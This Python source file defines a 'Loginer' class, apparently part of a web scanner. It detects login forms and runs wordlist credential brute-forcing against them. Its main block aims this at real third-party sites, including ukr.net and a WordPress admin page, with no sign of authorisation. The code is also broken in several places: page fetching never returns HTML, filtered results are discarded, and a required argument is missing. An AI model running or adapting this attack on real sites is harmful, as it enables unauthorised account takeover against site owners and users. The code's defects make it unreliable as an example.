"""TODO"""
from helpers.colors import bcolors
from tqdm import tqdm
from bs4 import BeautifulSoup
import urllib.request
import requests
from loginform import fill_login_form


class Loginer:
	"""docstring for Loginer"""
	def __init__(self, configer):
		"""TODO: find out if we need to pass whole configer object or just admin pages, 
		so it"s maybe will work faster. Or maybe we will make whole admin page finding here separately
		"""
		self.url = configer.url
		self.adminpages = configer.adminpages 
		self.filtered_pages = []
		self.passwords = open('assets/passwords.txt').readlines()
		self.users = open('assets/users.txt').readlines()
		# TODO

	def start_hack(self):
		print(bcolors.OKGREEN + "---------------------------------------------------------------------------")
		print(bcolors.OKGREEN + "--------------------------Loginer scan search------------------------------")
		print(bcolors.OKGREEN + "---------------------------------------------------------------------------")
		self.filter_pages(self.adminpages)
		print(bcolors.OKGREEN + "---------------------------Bruteforce check--------------------------------")
		self.bruteforce_attack(self.filtered_pages)
		print(bcolors.OKGREEN + "---------------------------Vocabulary attack-------------------------------")
		self.vocabulary_attack(self.filtered_pages)
		print(bcolors.OKGREEN + "---------------------------------------------------------------------------")
		print(bcolors.OKGREEN + "-------------------------Loginer scan finished-----------------------------")
		print(bcolors.OKGREEN + "---------------------------------------------------------------------------")

	def get_raw_html(self, url):
		"""Return HTML page from url"""
		try:
			res = requests.get(url)
		except:
			return None

	def has_captcha(self, html):
		if "captcha" in html.lower() or "recaptcha" in html.lower():
			return True
		else:
			return False

	def has_login_form(self, html):
		"""Return True if html has form with "login" and "password" fields"""
		soup = BeautifulSoup(html, "html.parser")
		form = soup.find("form")
		if form:
			input_fields = form.find_all("input")
			count = 0
			for field in input_fields:
				if field["type"] == "text":
					# print(field["name"])
					count += 1
				elif field["type"] == "password":
					# print(field["name"])
					count += 1
			if count == 2:
				# we have both login and password fields
				return True
			else:
				return False
		else:
			return False

	def filter_pages(self, page_urls):
		"""Create list of pages that has login forms in it"""
		login_pages = []
		for page in page_urls:
			html = self.get_raw_html(page)
			if html:
				if not self.has_captcha(html):
					if self.has_login_form(html):
						login_pages.append(page)
						print(bcolors.CYAN + f"{page} has login form!")
				else:
					print(bcolors.WANING + f"{page} has CAPTCHA, ignoring")
			else:
				print(bcolors.FAIL + f"can't parse HTML from: {page}")
		return login_pages

	def bruteforce_url(self, url, limit):
		""""""
		attempts = 0
		# get html of the page and retreive POST DATA (login, password fields, hidden fields, post url)
		for user in self.users:
			user = user.replace('\n', '')
			average = 0
			for password in self.passwords:
				password = password.replace('\n', '')
				# Return login, password and other input.names + target url + method
				r = requests.get(url)
				try:
					fillings = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))
				except:
					print(bcolors.WARNING + "Can't fill form, skipping page" + bcolors.OKGREEN)
					return

				# print(f"trying {user}: {password}", end='')
				payload = dict(fillings[:-2][0])
				post_url = fillings[-2:-1][0]
				method = fillings[-1:][0]

				if method == "POST":
					with requests.Session() as s:
						# get cookie for successful POST request
						res = requests.get(url)
						cookies = dict(res.cookies)
						p = s.post(post_url, data=payload, cookies=cookies)

						if not average:
							average = len(p.text)
						elif abs(average - len(p.text)) >= 100:
							print(bcolors.CYAN + "   login successful!" + bcolors.OKGREEN)
					attempts += 1

				elif method == "GET":
					with requests.Session() as s:
						res = requests.get(post_url, params=payload)
						if not average:
							average = len(res.text)
						elif abs(average - len(res.text)) >= 100:
							print(bcolors.CYAN + "login successful!" + bcolors.OKGREEN)
					attempts += 1

				else:
					# super edge case
					print(bcolors.WARNING + 'No method found in form, skipping page' + bcolors.OKGREEN)
					return
		if attempts > limit:
			print(bcolors.CYAN + f"Bruteforce possible! page: {url}" + bcolors.OKGREEN)
			return False
		else:
			print(bcolors.FAIL + f"Bruteforce attack not allowed : {url}" + bcolors.OKGREEN)
			return attempts


	def bruteforce_attack(self, page_urls):
		stats = {}
		for page in page_urls:
			attempts = self.bruteforce_url(page)
			if attempts:
				stats["page"] = attempts
		if stats:
			print(bcolors.OKGREEN + f"Pages where bruteforce possible:")
			for page in stats:
				if stats[page]:
					print(bcolors.CYAN + page + bcolors.OKGREEN)



	def vocabulary_attack(self, page_urls):
		pass


if __name__ == "__main__":
	from configer import Configer

	settings = {"local": False, "page_limit": None,}
	c = Configer("https://inmac.org/login/", settings)
	log = Loginer(c)
	
	log.bruteforce_attack(['https://id.bigmir.net/', 'http://leafus.com.ua/wp-admin', 'https://www.ukr.net/'])
